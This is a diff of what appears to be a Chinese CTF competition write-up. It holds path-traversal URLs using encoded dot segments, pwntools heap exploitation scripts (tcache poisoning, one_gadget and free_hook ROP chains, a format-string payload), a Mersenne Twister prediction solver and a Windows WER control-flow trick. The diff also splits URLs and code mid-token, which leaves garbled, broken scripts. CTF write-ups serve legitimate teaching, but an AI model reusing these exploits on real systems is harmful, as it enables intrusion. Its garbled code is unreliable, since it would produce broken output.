@@ -72,13 +72,15 @@ getme
 
 3.那么可以得知有任意目录穿越漏洞，经过穿越获取目标站点的日志。
 
-http://127.0.0.1:11777/icons/.%%32%65/logs/access_log
+http://127.0.0.1:
+11777/icons/.%%32%65/logs/access_log
 
 4.对日志分析，发现请求flag
 
 curl -v –path-as-is 
 
-http://127.0.0.1:11777/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/flag
+http://127.0.0.1:
+11777/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/flag
 
 （fakeflag）
 
@@ -86,7 +88,8 @@ http://127.0.0.1:11777/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%
 
 curl -v –path-as-is 
 
-http://127.0.0.1:11777/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/diajgk/djflgak/qweqr/eigopl/fffffflalllallalagggggggggg
+http://127.0.0.1:
+11777/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/diajgk/djflgak/qweqr/eigopl/fffffflalllallalagggggggggg
 
 (3)
 
@@ -193,7 +196,10 @@ docker save snowywar/blue -o blue.tar
 from PIL import Imageimport numpy as npfrom Crypto.Util import numberimport matplotlib.pyplot as pltimport imageio
 p1 = Image.open('flag.png').convert('RGB')p1_data = np.array(p1)blue_data = []a,b = p1_data.shape[0],p1_data.shape[1]for y in range(a): for x in range(b): if p1_data[y][x][0] <= 200 and p1_data[y][x][1] <= 200 and p1_data[y][x][2] >= 150: blue_data.append(p1_data[y][x]) else: blue_data.append([0,0,0])
 
-blue_data = np.array(blue_data).reshape(a*b*3)# blue_data = np.array(blue_data).reshape(a,b,3)# plt.imshow(blue_data)# plt.show()res = ''for i in range(len(blue_data)): if blue_data[i] != 0: if blue_data[i]%2 != 0: res += '1' else: res += '0'res2 = b''for i in range(0,len(res),8): res2 += number.long_to_bytes(int(res[i:i+8],2))
+blue_data = np.array(blue_data).reshape(a*b*3)
+# blue_data = np.array(blue_data).reshape(a,b,3)
+# plt.imshow(blue_data)
+# plt.show()res = ''for i in range(len(blue_data)): if blue_data[i] != 0: if blue_data[i]%2 != 0: res += '1' else: res += '0'res2 = b''for i in range(0,len(res),8): res2 += number.long_to_bytes(int(res[i:i+8],2))
 f2 = open('flag2.png', 'wb')f2.write(res2)f2.close()
 
 from PIL import Imageimport numpy as npimport gzip
@@ -489,7 +495,8 @@ def exp(): if local: p=process("./"+binary_name) #p=process("./"+binary_name,env
  add(5,0x440) # 切割,使main_arena+96地址写在tcache的fd位 add(6,0x18) # 0x38不会申请出tcache,且unsorted bin剩余部分不足0x20,申请出与tcache里堆块相同的地址 payload=p64(_dl_rtld_lock_recursive) edit(6,payload) # 申请出_dl_rtld_lock_recursive add(6,0x28) # 6 add(7,0x28) # 7
  payload=p64(one_gadget) edit(7,payload) success('_dl_rtld_lock_recursive:'+hex(_dl_rtld_lock_recursive)) success('one_gadget:'+hex(one_gadget)) #pause() cho(4) ia()
 
-time=0while True: try: time+=1 log.warn('time:'+str(time)) exp() break except:        continue
+time=0while True: try: time+=1 log.warn('time:'+str(time)) exp() break 
+except:        continue
 
 (2)
 
@@ -559,7 +566,8 @@ for i in range(12,21): add(0x60,'con')
 for i in range(12,21): delete(i)
 delete(-17405)
 for i in range(12,19): add(0x60,'con')
-add(0x60,p64(_IO_helper_jumps+0x68)) # 19add(0x60,'con') # 20add(0x60,'con') # 21add(0x60,str(frame)[0x68:0x68+0x50]) # 22
+add(0x60,p64(_IO_helper_jumps+0x68)) # 19add(0x60,'con') # 20add(0x60,'con') # 21add(0x60,str(frame)[0x68:
+0x68+0x50]) # 22
 # 改top_chunk的size，用于触发assertfor i in range(23,32): add(0x30,'con')
 for i in range(23,32): delete(i)
 delete(-17404)
@@ -607,7 +615,8 @@ def leak_address(): if(context.arch=='i386'): return u32(p.recv(4)) else : retur
 ru=lambda x:p.recvuntil(x)sl=lambda x:p.sendline(x)sd=lambda x:p.send(x)sa=lambda a,b:p.sendafter(a,b)sla=lambda a,b:p.sendlineafter(a,b)ia=lambda :p.interactive()
 sa("What's your name?n",'A'*8)ru('A'*8)heap_addr=leak_address()success("heap_addr:"+hex(heap_addr))
 payload="Yesn".ljust(8,'x00')+p64(heap_addr-0x8)sa("Do you want it?n",payload)ru("Here is your gift:")gift_addr=int(p.recv(14),16)success("gift_addr:"+hex(gift_addr))
-target_addr=gift_addr+0x1a8payload="%11$hhn|"+fmtstr_payload(13,{target_addr:heap_addr},numbwritten=1)#z("b *$rebase(0x14E6)")#pause()sa("Now,to find your flag in the gift!n",payload)
+target_addr=gift_addr+0x1a8payload="%11$hhn|"+fmtstr_payload(13,{target_addr:
+heap_addr},numbwritten=1)#z("b *$rebase(0x14E6)")#pause()sa("Now,to find your flag in the gift!n",payload)
 ia()
 
 05
@@ -624,7 +633,8 @@ WER
 
 1.通过 windows 的 WER 机制来隐藏控制流
 
-class Test {public: Test() { atexit(OnExit); PVOID pvParameter = NULL; DWORD dwPingInterval = RECOVERY_DEFAULT_PING_INTERVAL; DWORD dwFlags = 0; HRESULT hRes = RegisterApplicationRecoveryCallback(ApplicationRecoverCallback, pvParameter, dwPingInterval, dwFlags); }};void OnExit(){ WerReportHang(GetForegroundWindow(), NULL); TriggerException();}
+class Test {public: Test() { atexit(OnExit); PVOID pvParameter = NULL; DWORD dwPingInterval = RECOVERY_DEFAULT_PING_INTERVAL; DWORD dwFlags = 0; HRESULT hRes = RegisterApplicationRecoveryCallback(ApplicationRecoverCallback, pvParameter, dwPingInterval, dwFlags); }};
+void OnExit(){ WerReportHang(GetForegroundWindow(), NULL); TriggerException();}
 
 — 往期回顾 —
 
@@ -650,50 +660,28 @@ func exp() {
  output := string(out[:]) fmt.Println(output)}
 func main() { exp()
 }
-```
-
-
-
-```
 <?phpdefine('Mc_Encryption_Key','GKwHuLj9AOhaxJ2');
 $strings = 'http://192.168.28.175/a.zip';
 echo(sys_auth($strings));
 
 function sys_auth($string, $type = 0, $key = '', $expiry = 0) { if(is_array($string)) $string = json_encode($string); if($type == 1) $string = str_replace('-','+',$string); $ckey_length = 4; $key = md5($key ? $key : Mc_Encryption_Key); $keya = md5(substr($key, 0, 16)); $keyb = md5(substr($key, 16, 16)); $keyc = $ckey_length ? ($type == 1 ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : ''; $cryptkey = $keya.md5($keya.$keyc); $key_length = strlen($cryptkey); $string = $type == 1 ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string; $string_length = strlen($string); $result = ''; $box = range(0, 255); $rndkey = array(); for($i = 0; $i <= 255; $i++) { $rndkey[$i] = ord($cryptkey[$i % $key_length]); } for($j = $i = 0; $i < 256; $i++) { $j = ($j + $box[$i] + $rndkey[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; } for($a = $j = $i = 0; $i < $string_length; $i++) { $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256])); } if($type == 1) { if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) { $result = substr($result, 26); $json = json_decode($result,1); if(!is_numeric($result) && $json){ return $json; }else{ return $result; } } return ''; } return str_replace('+', '-', $keyc.str_replace('=', '', base64_encode($result)));}
-```
-
-
-
-```
 from PIL import Imageimport numpy as npfrom Crypto.Util import numberimport matplotlib.pyplot as pltimport imageio
 p1 = Image.open('flag.png').convert('RGB')p1_data = np.array(p1)blue_data = []a,b = p1_data.shape[0],p1_data.shape[1]for y in range(a): for x in range(b): if p1_data[y][x][0] <= 200 and p1_data[y][x][1] <= 200 and p1_data[y][x][2] >= 150: blue_data.append(p1_data[y][x]) else: blue_data.append([0,0,0])
 
-blue_data = np.array(blue_data).reshape(a*b*3)# blue_data = np.array(blue_data).reshape(a,b,3)# plt.imshow(blue_data)# plt.show()res = ''for i in range(len(blue_data)): if blue_data[i] != 0: if blue_data[i]%2 != 0: res += '1' else: res += '0'res2 = b''for i in range(0,len(res),8): res2 += number.long_to_bytes(int(res[i:i+8],2))
+blue_data = np.array(blue_data).reshape(a*b*3)
+# blue_data = np.array(blue_data).reshape(a,b,3)
+# plt.imshow(blue_data)
+# plt.show()res = ''for i in range(len(blue_data)): if blue_data[i] != 0: if blue_data[i]%2 != 0: res += '1' else: res += '0'res2 = b''for i in range(0,len(res),8): res2 += number.long_to_bytes(int(res[i:i+8],2))
 f2 = open('flag2.png', 'wb')f2.write(res2)f2.close()
-```
-
-
-
-```
 from PIL import Imageimport numpy as npimport gzip
 p = Image.open('flag2.png').convert('L')p_data = np.array(p).reshape(p.size[0]*p.size[1])res = ''for i in p_data: if i %2 == 0: res += '0' else: res+='1'print(res)
 res2 = '00011111100010110000100000000000010110011101111001110111011000100000001011111111011100110111000100001100011101100000111001110001101010110100111001001100001100100100101010110010010011000011010100110001001100000011010101001010010010010100101101001101101101000011010001001111001100010011011000110101010010010011001001001010001100110100101100110101000001110000100101011000100110001101010000000010000000000001011010010101011110011001111000101000000000000000000000000000'print(gzip.decompress(bytes(int(res2[i:i+8],2) for i in range(0,len(res2),8))))
-```
-
-
-
-```
 from scipy.io import wavfile
 samplerate, data = wavfile.read('test.wav')rounded_data = []unique = []for i in data: r = round(i, -2) rounded_data.append(r) if r in unique: continue else: unique.append(r)unique.sort()print(unique)
 
 flag_hex = []
 for a in rounded_data: flag_hex.append(hex(unique.index(a))[2:])
 print("".join(flag_hex))
-```
-
-
-
-```
 package main
 import ( "bufio" "fmt" "io" "os")
 var key = "6603"
@@ -703,11 +691,6 @@ func main(){ encodeStr := openTxt("out.txt") var decodeStr = strByXOR(encodeStr,
 func openTxt(txt string) string { filePath := txt file, err := os.Open(filePath) if err != nil { fmt.Println("文件打开失败 = ", err) return "" } defer file.Close() // 关闭文本流 reader := bufio.NewReader(file) // 读取文本数据 for { str, err := reader.ReadString('n') if err ==io.EOF { break } return str } fmt.Println("文件读取结束") return ""}
 
 func strByXOR(message string,keywords string) string{ messageLen := len(message) keywordsLen := len(keywords) result := "" for i := 0; i < messageLen; i++ { result += string(message[i] ^ keywords[i%keywordsLen]) } return result}
-```
-
-
-
-```
 def rand(self):
  if self.index == 0:
  self.generate()
@@ -720,30 +703,15 @@ def rand(self):
  return ((y << shift) ^ (y >> (32 - shift))) & 0xffffffff
  def cs2r(self, y, shift):
  return ((y >> shift) ^ (y << (32 - shift))) & 0xffffffff
-```
-
-
-
-```
 def generate(self):
  for i in range(624):
  y = (self.MT[i] & 0x80000000) + (self.MT[(i+1)%624] & 0x7fffffff)
  self.MT[i] = self.MT[(i+397)%624] ^ (y >> 1)
  if y & 1:
  self.MT[i] ^= 2567483520
-```
-
-
-
-```
 for i in range(1,624):
  t = 2037740385 * (self.MT[i-1] ^ (self.MT[i-1] >> 30)) + 1
  self.MT[i] = t & 0xffffffff
-```
-
-
-
-```
 def fix(num):
  mask = bin(2037740385)[2:].rjust(32,"0")
  source = bin(num)[2:].rjust(32,"0")
@@ -757,11 +725,6 @@ def fix(num):
 random_num = [...]
 for i in range(2000):
  ut.submit(fix(random_num[i]))
-```
-
-
-
-```
 def get_symbolic(self, guess):
  name = next(SYMBOLIC_COUNTER)
  guess = guess.zfill(32)
@@ -774,11 +737,6 @@ def get_symbolic(self, guess):
  self.solver.add(Extract(i, i, self.symbolic_guess) == bit)
 
  return self.symbolic_guess
-```
-
-
-
-```
 def symbolic_untamper(self, solver, y):
  name = next(SYMBOLIC_COUNTER)
 
@@ -796,17 +754,7 @@ def symbolic_untamper(self, solver, y):
 
  solver.add(equations)
  return y1
-```
-
-
-
-```
 self.solver.add(self.MT)
-```
-
-
-
-```
 def symbolic_twist(self, MT, n=624, upper_mask=0x80000000, lower_mask=0x7FFFFFFF, a=0x9908B0DF, m=397):
  MT = [i for i in MT]
  for i in range(n):
@@ -814,22 +762,12 @@ def symbolic_twist(self, MT, n=624, upper_mask=0x80000000, lower_mask=0x7FFFFFFF
  xA = LShR(x, 1)
  xB = If(x & 1 == 0, xA, xA ^ a)
  MT[i] = MT[(i + m) % n] ^ xB
-```
-
-
-
-```
 name = next(SYMBOLIC_COUNTER)
  next_mt = self.symbolic_twist(self.MT)
  self.MT = [BitVec('MT_%d_%d'%(i,name), 32) for i in range(624)]
  for i in range(624):
  self.solver.add(self.MT[i] == next_mt[i])
  self.index = 0
-```
-
-
-
-```
 def get_random(self):
  self.solver.check()
  model = self.solver.model()
@@ -838,12 +776,7 @@ def get_random(self):
  r = Random()
  r.setstate(result_state)
  return r
-```
-
-
-
-```
-#encoding: utf-8#!/usr/bin/python
+    #encoding: utf-8#!/usr/bin/python
 from pwn import *import sys#from LibcSearcher import LibcSearcher
 context.log_level = 'debug'context.arch='amd64'
 local=0binary_name='pwn'libc_name='libc-2.31.so'ld_name='ld-2.31.so'
@@ -872,13 +805,9 @@ def exp(): if local: p=process("./"+binary_name) #p=process("./"+binary_name,env
  add(5,0x440) # 切割,使main_arena+96地址写在tcache的fd位 add(6,0x18) # 0x38不会申请出tcache,且unsorted bin剩余部分不足0x20,申请出与tcache里堆块相同的地址 payload=p64(_dl_rtld_lock_recursive) edit(6,payload) # 申请出_dl_rtld_lock_recursive add(6,0x28) # 6 add(7,0x28) # 7
  payload=p64(one_gadget) edit(7,payload) success('_dl_rtld_lock_recursive:'+hex(_dl_rtld_lock_recursive)) success('one_gadget:'+hex(one_gadget)) #pause() cho(4) ia()
 
-time=0while True: try: time+=1 log.warn('time:'+str(time)) exp() break except:        continue
-```
-
-
-
-```
-#encoding: utf-8#!/usr/bin/python
+time=0while True: try: time+=1 log.warn('time:'+str(time)) exp() break 
+except:        continue
+    #encoding: utf-8#!/usr/bin/python
 from pwn import *import sys#from LibcSearcher import LibcSearcher
 context.log_level = 'debug'context.arch='amd64'
 local=1binary_name='pwn'libc_name='libc-2.31.so'
@@ -914,13 +843,14 @@ for i in range(12,21): add(0x60,'con')
 for i in range(12,21): delete(i)
 delete(-17405)
 for i in range(12,19): add(0x60,'con')
-add(0x60,p64(_IO_helper_jumps+0x68)) # 19add(0x60,'con') # 20add(0x60,'con') # 21add(0x60,str(frame)[0x68:0x68+0x50]) # 22
+add(0x60,p64(_IO_helper_jumps+0x68)) # 19add(0x60,'con') # 20add(0x60,'con') # 21add(0x60,str(frame)[0x68:
+0x68+0x50]) # 22
 # 改top_chunk的size，用于触发assertfor i in range(23,32): add(0x30,'con')
 for i in range(23,32): delete(i)
 delete(-17404)
 for i in range(23,30): add(0x30,'con')
 add(0x30,p64(heap_addr+0x990)) # 30add(0x30,'con') # 31add(0x30,'con') # 32add(0x30,p64(0x18)*2) # 33
-#z("b *"+hex(setcontext+61))#pause()
+    #z("b *"+hex(setcontext+61))#pause()
 cho(1)sla('Size:',str(0x30))
 orw = p64(pop_rdi)+p64(__free_hook+0xf8)orw += p64(pop_rsi)+p64(0)orw += p64(pop_rsi)+p64(0)+p64(open_addr)
 orw += p64(pop_rdi)+p64(3)orw += p64(pop_rsi)+p64(__free_hook+0x100)orw += p64(pop_rdx_r12)+p64(0x30)+p64(0)+p64(read_addr)
@@ -929,11 +859,6 @@ orw = orw.ljust(0xf8,'x00')orw += b'./flagx00x00'
 sleep(1)sd(orw)
 
 ia()
-```
-
-
-
-```
 #!/usr/bin/python
 from pwn import *import sys
 context.log_level = 'debug'context.arch='amd64'
@@ -944,14 +869,11 @@ def leak_address(): if(context.arch=='i386'): return u32(p.recv(4)) else : retur
 ru=lambda x:p.recvuntil(x)sl=lambda x:p.sendline(x)sd=lambda x:p.send(x)sa=lambda a,b:p.sendafter(a,b)sla=lambda a,b:p.sendlineafter(a,b)ia=lambda :p.interactive()
 sa("What's your name?n",'A'*8)ru('A'*8)heap_addr=leak_address()success("heap_addr:"+hex(heap_addr))
 payload="Yesn".ljust(8,'x00')+p64(heap_addr-0x8)sa("Do you want it?n",payload)ru("Here is your gift:")gift_addr=int(p.recv(14),16)success("gift_addr:"+hex(gift_addr))
-target_addr=gift_addr+0x1a8payload="%11$hhn|"+fmtstr_payload(13,{target_addr:heap_addr},numbwritten=1)#z("b *$rebase(0x14E6)")#pause()sa("Now,to find your flag in the gift!n",payload)
+target_addr=gift_addr+0x1a8payload="%11$hhn|"+fmtstr_payload(13,{target_addr:
+heap_addr},numbwritten=1)#z("b *$rebase(0x14E6)")#pause()sa("Now,to find your flag in the gift!n",payload)
 ia()
-```
-
-
-
-```
-class Test {public: Test() { atexit(OnExit); PVOID pvParameter = NULL; DWORD dwPingInterval = RECOVERY_DEFAULT_PING_INTERVAL; DWORD dwFlags = 0; HRESULT hRes = RegisterApplicationRecoveryCallback(ApplicationRecoverCallback, pvParameter, dwPingInterval, dwFlags); }};void OnExit(){ WerReportHang(GetForegroundWindow(), NULL); TriggerException();}
+class Test {public: Test() { atexit(OnExit); PVOID pvParameter = NULL; DWORD dwPingInterval = RECOVERY_DEFAULT_PING_INTERVAL; DWORD dwFlags = 0; HRESULT hRes = RegisterApplicationRecoveryCallback(ApplicationRecoverCallback, pvParameter, dwPingInterval, dwFlags); }};
+void OnExit(){ WerReportHang(GetForegroundWindow(), NULL); TriggerException();}
 ```
 
 
